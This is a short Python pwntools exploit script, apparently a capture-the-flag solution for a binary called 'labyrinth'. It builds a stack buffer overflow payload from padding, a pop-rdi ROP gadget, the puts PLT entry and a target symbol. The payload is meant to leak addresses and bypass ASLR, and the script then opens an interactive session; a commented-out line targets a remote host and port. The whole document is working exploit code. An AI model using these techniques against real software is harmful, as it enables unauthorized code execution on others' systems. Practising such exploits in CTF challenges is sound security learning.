from pwn import *

# https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak
# https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass

elf = context.binary = ELF('./labyrinth')
libc = elf.libc

io = process('./labyrinth')
# io = connect('64.227.41.83', 31292)

pop_rdi = 0x40166b # ROPgadget --binary labyrinth | grep rdi

# leak address of escape_plan with puts
payload = flat(
    b'A' * 48,
    pop_rdi,
    elf.plt['puts'],
    # elf.sym['main'],
    elf.sym['escape_plan'],
    # elf.got['puts']
)

log.info('plt[puts] -> ' + hex(elf.plt['puts']))

prompt = b'>>'
io.recvuntil(prompt)
io.sendline(b'069')
io.recvline(prompt)
io.sendline(payload)

io.interactive()
